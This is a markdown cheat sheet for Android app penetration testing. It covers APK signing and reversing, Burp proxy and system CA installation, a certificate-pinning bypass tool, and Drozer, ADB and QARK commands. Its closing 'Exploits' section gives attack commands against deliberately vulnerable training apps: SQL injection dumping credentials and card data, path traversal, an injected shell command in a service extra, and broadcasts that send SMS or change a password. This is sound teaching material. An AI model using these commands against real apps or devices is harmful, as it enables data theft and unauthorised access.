# Mobile Application Security Testing


## Android Build Process

In order to inspect the content of APK file, first need to change its extension to .ZIP and then decompress it.

Once decompressed, following files and directories revealed 
- AndroidManifest.xml
- classes.dex
- resources.arsc
- /assets
- /lib
- /META-INF
- /res
- Third-Party libraries, etc...


**This files holds the keys to most of security topics**



##### Signing

Generate private key using keytool

```sh
keytool -genkey -v -keystore foo.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias myalias
```

Sign APK 

```sh
jarsigner -signalg SHA1withRSA -digestalg SHA1 -keystore foo.keystore test.apk myalias
```

Build APK

```sh
apktool b . #In the folder generated when you decompiled the application
```



Inspect the status of signed APK file

```sh
jarsigner -verify -verbose -certs com.foo.android.activity.apk
```


Align APK file due to improve RAM utilization when running the application

```sh
zipalign -v 4 project_unaligned.apk project.apk
```


---


Convert CERT.RSA to pem ( Human Readable)

```sh
openssl pkcs7 -inform DER -print_certs -out cert.pem -in CERT.RSA
```


See details for the public key in the certificate

```sh
openssl x509 -in cert.pem -noout -text
```


Check file integrity 

```sh
openssl sha1 -binary MANIFEST.MF | openssl base64 
```

---
---
---


## Reversing APKs

##### APKTool

Decode .apk file
```
apktool d android.apk
```

Prevents classes.dex file from being disassembled
```
apktool d android.apk -s
```


##### Dex2jar

Convert classes.dex file to a .jar file
```
d2j-dex2jar classes.dex -i output_file.jar
```

```
d2j-dex2jar android.apk -i output_file.jar
```

##### Jadx-GUI

Decompile APK/JAR/DEX....
```
jadx-gui > Open File > File
```




##### Assembler / Disassembler 

Dissasemble .dex file
```
d2j-backsmali classes.dex
```

Assemble source file
```
d2j-smali source_dir/
```

---
---
---



## Network Configuration

#### Burp Proxy Configuration

Set up Proxy
```
adb shell settings put global http_proxy <IP>:<PORT>
```

Get Proxy List
```
adb shell settings get global http_proxy
```

Remove Proxy
```
adb shell settings put global http_proxy :0
```
```
adb shell settings delete global http_proxy
```


OR run emulator the **-http-proxy** option
```zsh
~/Library/Android/sdk/emulator/emulator -avd <avd_name> -http-proxy <IP>:<PORT>
```



#### Install Proxy Certification

Export Burp CA 


Convert .DER to .PEM
```zsh
openssl x509 -inform DER -in <cert.der> -out <cert.pem>
```


Output the hash with **subject_hash_old** to rename the .PEM file
```zsh
openssl x509 -inform PEM -subject_hash_old -in <cert.pem> | head -1

mv <cert.pem> <cert>.0
```


List AVDs
```zsh
~/Library/Android/sdk/emulator/emulator -list-avds
```


Run AVD with the **-writable-system** option
```zsh
~/Library/Android/sdk/emulator/emulator -avd <avd_name> -http-proxy <IP>:<PORT>  -writable-system
```


Remount **/system** as writable / Copy the certificate to the device
```zsh
adb root
adb remount
adb push <cert>.0 /sdcard/
adb shell mv /sdcard/<cert>.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/<cert>.0
adb reboot
```


Browsing to _Settings -> Security -> Trusted Credentials_ should show the new “Portswigger CA” as a system trusted CA




#### CA Pinning Bypass


Automated Tool - [apk-mitm](https://github.com/shroudedcode/apk-mitm)
```
# Install
$ sudo apt install nodejs npm
$ npm install -g apk-mitm

# Example
$ apk-mitm <path-to-apk>
```


[Reference](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/make-apk-accept-ca-certificate)



---
---
---


## Static/Dynamic Code Analysis


#### Drozer 


Install [Drozer](https://github.com/WithSecureLabs/drozer/)
```zsh
pip3 install drozer-3.0.2-py3-none-any.whl
pip install twisted
pip install service_identity
```


Install [Drozen-Agent](https://github.com/WithSecureLabs/drozer-agent)
```zsh
adb install drozer-agent.apk
```


Establish the communication between the Drozer Client and Agent
```zsh
adb forward tcp:31415 tcp:31415

drozer console connect
```



---


RoadMap
1) Static Code Analysis
2) SQL Injection
3) Path/Directory Traversal
4) Vulnerable Activities
5) Vulnerable Recievers
6) Vulnerable Services
	1) /data/data/{package}/files
7) Shared Preferences
	1) /data/data/{package}/shared_prefs
8) Local Databases
	1) /data/data/{package}/databases
		1) .header on
		2) .mode column
		3) .timer on
		4) SELECT * FROM table;



Drozer Commands
```
# List all the installed packages
$ dz> run app.package.list

# Find accessible content URIs
$ dz> run scanner.provider.finduris -a <package_name>

# Find the package name of a specific app
$ dz> run app.package.list -f (string to be searched)

# See basic information
$ dz> run app.package.info -a (package name)

# Identify the exported application components
$ dz> run app.package.attacksurface (package name)

# Identify the list of exported Activities
$ dz> run app.activity.info -a (package name)

# Launch the exported Activities
$ dz> run app.activity.start --component (package name) (component name)

# Identify the list of exported Broadcast receivers
$ dz> run app.broadcast.info -a (package name)

# Send a message to a Broadcast receiver
$ dz> run app.broadcast.send --action (broadcast receiver name) --component (package name) (component name)  --extra (number of arguments)

# Detect SQL injections in content providers
$ dz> run scanner.provider.injection -a (package name)

# Detect Path Traversal in content providers
$ dz> run scanner.provider.traversal -a (package name)
```



ADB Commands
```
adb shell pm list packages              # List installed packages
adb shell pm path <package>             # Returns path of package
adb shell am start                      # Starts activity
adb shell am startservice               # Starts service
adb shell am broadcast                  # Send a broadcast

adb shell pull <device_path> <local_path>     
adb shell push <local_path> <device_path>

adb install <package>                   # Install pacakge

```


#### QARK

Install [QARK](https://github.com/linkedin/qark)
```
pip2 install qark
qark --help

OR

git clone https://github.com/linkedin/qark
python2 setup.py install
```






#### Exploits

 FourGates Broadcast receivers
```drozen
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver  --extra string phoneNumber 5554 --extra string message "hacked"
```



InjectMe SQL Injection
```
dz> run scanner.provider.injection -a com.elearnsecurity.injectme
dz> run scanner.provider.finduris -a com.elearnsecurity.injectme
dz > run app.provider.query content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/


adb shell content query --uri content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/
```


FileBrowser Path Traversal 
```
dz> run scanner.provider.traversal -a com.els.filebrowser
dz> run app.provider.read content://com.els.filebrowser/../../../proc/cpuinfo
```



LeakResult Bypass
```
$ adb shell logcat

dz> run app.activity.start --component com.elearnsecurity.insecureactivities com.elearnsecurity.insecureactivities.LeakyActivity


adb shell am start -n com.elearnsecurity.insecureactivities/.LeakyActivity
```




SillyService Command Injection
```
adb shell am startservice –n com.elearnsecurity.sillyservice/.SillyService –e "COMMAND" "find; ls"
```



VulnerableReceiver BroadcastReceiver
```
dz > run app.broadcast.send --action com.elearnsecurity.vulnerablereceiver.CHANGEPW --component com.elearnsecurity.vulnerablereceiver com.elearnsecurity.vulnerablereceiver.VulnerableReceiver --extra string PASSWORD "hacked"



am broadcast -a com.elearnsecurity.vulnerablereceiver.CHANGEPW -e PASSWORD "hacked"
```



WeakWallet Sql Injection
```
dz> run scanner.provider.injection -a com.elearnsecurity.weakwallet
dz> run scanner.provider.finduris -a com.elearnsecurity.weakwallet
dz > run app.provider.query content://com.elearnsecurity.provider.Wallet/cards


adb shell content query --uri content://com.elearnsecurity.provider.Wallet/cards/
```

